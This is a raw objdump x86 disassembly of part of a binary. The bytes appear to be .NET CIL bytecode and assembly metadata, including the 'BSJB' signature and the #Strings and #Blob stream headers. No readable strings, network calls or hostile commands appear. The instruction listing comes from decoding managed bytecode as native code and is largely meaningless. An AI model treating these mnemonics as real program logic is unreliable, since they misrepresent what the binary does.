  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	c0 1d 00 00 23 53 74 	rcrb   $0x74,0x53230000
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 e8                	add    %ch,%al
  405a35:	3b 00                	cmp    (%eax),%eax
  405a37:	00 50 28             	add    %dl,0x28(%eax)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 38                	add    %bh,(%eax)
  405a41:	64 00 00             	add    %al,%fs:(%eax)
  405a44:	10 00                	adc    %al,(%eax)
  405a46:	00 00                	add    %al,(%eax)
  405a48:	23 47 55             	and    0x55(%edi),%eax
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 48 64             	add    %cl,0x64(%eax)
  405a52:	00 00                	add    %al,(%eax)
  405a54:	40                   	inc    %eax
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	f3 0a 01             	repz or (%ecx),%al
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 3f                	add    %bh,(%edi)
  405ae5:	19 f4                	sbb    %esi,%esp
  405ae7:	0f 0a                	(bad)
  405ae9:	00 8a 00 09 16 0a    	add    %cl,0xa160900(%edx)
  405aef:	00 a5 19 78 18 0a    	add    %ah,0xa187819(%ebp)
  405af5:	00 8f 0f 8b 1d 06    	add    %cl,0x61d8b0f(%edi)
  405afb:	00 2f                	add    %ch,(%edi)
  405afd:	14 9e                	adc    $0x9e,%al
  405aff:	0b 06                	or     (%esi),%eax
  405b01:	00 86 08 09 16 0a    	add    %al,0xa160908(%esi)
  405b07:	00 a8 10 09 16 0a    	add    %ch,0xa160910(%eax)
  405b0d:	00 14 18             	add    %dl,(%eax,%ebx,1)
  405b10:	8b 1d 06 00 ff 19    	mov    0x19ff0006,%ebx
  405b16:	f4                   	hlt
  405b17:	0f 0e                	femms
  405b19:	00 0b                	add    %cl,(%ebx)
  405b1b:	12 f5                	adc    %ch,%dh
  405b1d:	0b 0e                	or     (%esi),%ecx
  405b1f:	00 ca                	add    %cl,%dl
  405b21:	18 f5                	sbb    %dh,%ch
  405b23:	0b 06                	or     (%esi),%eax
  405b25:	00 44 1c 9e          	add    %al,-0x62(%esp,%ebx,1)
  405b29:	0b 06                	or     (%esi),%eax
  405b2b:	00 2f                	add    %ch,(%edi)
  405b2d:	13 e5                	adc    %ebp,%esp
  405b2f:	1b 06                	sbb    (%esi),%eax
  405b31:	00 65 10             	add    %ah,0x10(%ebp)
  405b34:	f4                   	hlt
  405b35:	0f 0a                	(bad)
  405b37:	00 20                	add    %ah,(%eax)
  405b39:	17                   	pop    %ss
  405b3a:	55                   	push   %ebp
  405b3b:	00 06                	add    %al,(%esi)
  405b3d:	00 2b                	add    %ch,(%ebx)
  405b3f:	00 ca                	add    %cl,%dl
  405b41:	02 12                	add    (%edx),%dl
  405b43:	00 20                	add    %ah,(%eax)
  405b45:	00 a1 15 12 00 01    	add    %ah,0x1001215(%ecx)
  405b4b:	00 f4                	add    %dh,%ah
  405b4d:	0f 12 00             	movlps (%eax),%xmm0
  405b50:	e2 08                	loop   0x405b5a
  405b52:	a1 15 06 00 01       	mov    0x1000615,%eax
  405b57:	08 f4                	or     %dh,%ah
  405b59:	0f 06                	clts
  405b5b:	00 e8                	add    %ch,%al
  405b5d:	0b e5                	or     %ebp,%esp
  405b5f:	1b 06                	sbb    (%esi),%eax
  405b61:	00 a9 14 ce 17 06    	add    %ch,0x617ce14(%ecx)
  405b67:	00 a5 05 ce 17 06    	add    %ah,0x617ce05(%ebp)
  405b6d:	00 c8                	add    %cl,%al
  405b6f:	0f 65 02             	pcmpgtw (%edx),%mm0
  405b72:	06                   	push   %es
  405b73:	00 ef                	add    %ch,%bh
  405b75:	09 a1 15 06 00 5c    	or     %esp,0x5c000615(%ecx)
  405b7b:	0a a1 15 06 00 0c    	or     0xc000615(%ecx),%ah
  405b81:	09 43 15             	or     %eax,0x15(%ebx)
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 c1                	add    %al,%cl
  405b87:	15 00 00 06 00       	adc    $0x60000,%eax
  405b8c:	34 09                	xor    $0x9,%al
  405b8e:	55                   	push   %ebp
  405b8f:	11 06                	adc    %eax,(%esi)
  405b91:	00 bb 09 55 11 06    	add    %bh,0x6115509(%ebx)
  405b97:	00 9c 09 55 11 06 00 	add    %bl,0x61155(%ecx,%ecx,1)
  405b9e:	43                   	inc    %ebx
  405b9f:	0a 55 11             	or     0x11(%ebp),%dl
  405ba2:	06                   	push   %es
  405ba3:	00 0f                	add    %cl,(%edi)
  405ba5:	0a 55 11             	or     0x11(%ebp),%dl
  405ba8:	06                   	push   %es
  405ba9:	00 28                	add    %ch,(%eax)
  405bab:	0a 55 11             	or     0x11(%ebp),%dl
  405bae:	06                   	push   %es
  405baf:	00 4b 09             	add    %cl,0x9(%ebx)
  405bb2:	55                   	push   %ebp
  405bb3:	11 06                	adc    %eax,(%esi)
  405bb5:	00 7f 09             	add    %bh,0x9(%edi)
  405bb8:	55                   	push   %ebp
  405bb9:	11 06                	adc    %eax,(%esi)
  405bbb:	00 66 09             	add    %ah,0x9(%esi)
  405bbe:	0c 0c                	or     $0xc,%al
  405bc0:	06                   	push   %es
  405bc1:	00 20                	add    %ah,(%eax)
  405bc3:	09 82 15 06 00 f1    	or     %eax,-0xefff9eb(%edx)
  405bc9:	08 a1 15 06 00 d8    	or     %ah,-0x27fff9eb(%ecx)
  405bcf:	09 55 11             	or     %edx,0x11(%ebp)
  405bd2:	06                   	push   %es
  405bd3:	00 1a                	add    %bl,(%edx)
  405bd5:	03 9e 0b 06 00 9f    	add    -0x60fff9f5(%esi),%ebx
  405bdb:	1b f4                	sbb    %esp,%esi
  405bdd:	0f 06                	clts
  405bdf:	00 97 1a f4 0f 06    	add    %dl,0x60ff41a(%edi)
  405be5:	00 ec                	add    %ch,%ah
  405be7:	0b e5                	or     %ebp,%esp
  405be9:	1b 0a                	sbb    (%edx),%ecx
  405beb:	00 d0                	add    %dl,%al
  405bed:	1c 09                	sbb    $0x9,%al
  405bef:	16                   	push   %ss
  405bf0:	06                   	push   %es
  405bf1:	00 1f                	add    %bl,(%edi)
  405bf3:	10 fe                	adc    %bh,%dh
  405bf5:	1c 06                	sbb    $0x6,%al
  405bf7:	00 fd                	add    %bh,%ch
  405bf9:	12 fe                	adc    %dh,%bh
  405bfb:	1c 06                	sbb    $0x6,%al
  405bfd:	00 7f 0b             	add    %bh,0xb(%edi)
  405c00:	fe                   	(bad)
  405c01:	1c 06                	sbb    $0x6,%al
  405c03:	00 f9                	add    %bh,%cl
  405c05:	11 f4                	adc    %esi,%esp
  405c07:	0f 0a                	(bad)
  405c09:	00 5a 18             	add    %bl,0x18(%edx)
  405c0c:	64 19 0a             	sbb    %ecx,%fs:(%edx)
  405c0f:	00 1d 1a 64 19 0a    	add    %bl,0xa19641a
  405c15:	00 ac 0e 64 19 0a 00 	add    %ch,0xa1964(%esi,%ecx,1)
  405c1c:	24 1d                	and    $0x1d,%al
  405c1e:	78 18                	js     0x405c38
  405c20:	0a 00                	or     (%eax),%al
  405c22:	36 08 78 18          	or     %bh,%ss:0x18(%eax)
  405c26:	0a 00                	or     (%eax),%al
  405c28:	21 08                	and    %ecx,(%eax)
  405c2a:	78 18                	js     0x405c44
  405c2c:	06                   	push   %es
  405c2d:	00 c9                	add    %cl,%cl
  405c2f:	0c f4                	or     $0xf4,%al
  405c31:	0f 06                	clts
  405c33:	00 d2                	add    %dl,%dl
  405c35:	12 f4                	adc    %ah,%dh
  405c37:	0f 06                	clts
  405c39:	00 46 10             	add    %al,0x10(%esi)
  405c3c:	f4                   	hlt
  405c3d:	0f 0a                	(bad)
  405c3f:	00 c1                	add    %al,%cl
  405c41:	17                   	pop    %ss
  405c42:	64 19 0a             	sbb    %ecx,%fs:(%edx)
  405c45:	00 5b 17             	add    %bl,0x17(%ebx)
  405c48:	64 19 06             	sbb    %eax,%fs:(%esi)
  405c4b:	00 e1                	add    %ah,%cl
  405c4d:	17                   	pop    %ss
  405c4e:	f4                   	hlt
  405c4f:	0f 06                	clts
  405c51:	00 b1 05 f4 0f 0a    	add    %dh,0xa0ff405(%ecx)
  405c57:	00 81 0f 78 18 0a    	add    %al,0xa18780f(%ecx)
  405c5d:	00 f6                	add    %dh,%dh
  405c5f:	0d 8b 1d 0a 00       	or     $0xa1d8b,%eax
  405c64:	3e 1b 64 19 0a       	sbb    %ds:0xa(%ecx,%ebx,1),%esp
  405c69:	00 67 11             	add    %ah,0x11(%edi)
  405c6c:	09 16                	or     %edx,(%esi)
  405c6e:	0a 00                	or     (%eax),%al
  405c70:	7f 17                	jg     0x405c89
  405c72:	36 11 06             	adc    %eax,%ss:(%esi)
  405c75:	00 9c 0a f4 0f 06 00 	add    %bl,0x60ff4(%edx,%ecx,1)
  405c7c:	1a 0e                	sbb    (%esi),%cl
  405c7e:	9e                   	sahf
  405c7f:	0b 06                	or     (%esi),%eax
  405c81:	00 e8                	add    %ch,%al
  405c83:	0d f4 0f 0a 00       	or     $0xa0ff4,%eax
  405c88:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405c89:	0d f4 0f 0a 00       	or     $0xa0ff4,%eax
  405c8e:	ed                   	in     (%dx),%eax
  405c8f:	07                   	pop    %es
  405c90:	f4                   	hlt
  405c91:	0f 06                	clts
  405c93:	00 8e 14 f4 0f 06    	add    %cl,0x60ff414(%esi)
  405c99:	00 86 1b 9e 0b 06    	add    %al,0x60b9e1b(%esi)
  405c9f:	00 c2                	add    %al,%dl
  405ca1:	0f 65 02             	pcmpgtw (%edx),%mm0
  405ca4:	06                   	push   %es
  405ca5:	00 14 15 9e 0b 0a 00 	add    %dl,0xa0b9e(,%edx,1)
  405cac:	5b                   	pop    %ebx
  405cad:	05 78 18 06 00       	add    $0x61878,%eax
  405cb2:	c1 01 f4             	roll   $0xf4,(%ecx)
  405cb5:	0f 06                	clts
  405cb7:	00 23                	add    %ah,(%ebx)
  405cb9:	12 65 02             	adc    0x2(%ebp),%ah
  405cbc:	0a 00                	or     (%eax),%al
  405cbe:	52                   	push   %edx
  405cbf:	18 43 15             	sbb    %al,0x15(%ebx)
  405cc2:	0a 00                	or     (%eax),%al
  405cc4:	65 12 43 15          	adc    %gs:0x15(%ebx),%al
  405cc8:	06                   	push   %es
  405cc9:	00 ed                	add    %ch,%ch
  405ccb:	1c 55                	sbb    $0x55,%al
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 70 14             	add    %dh,0x14(%eax)
  405cd2:	65 02 06             	add    %gs:(%esi),%al
  405cd5:	00 68 0d             	add    %ch,0xd(%eax)
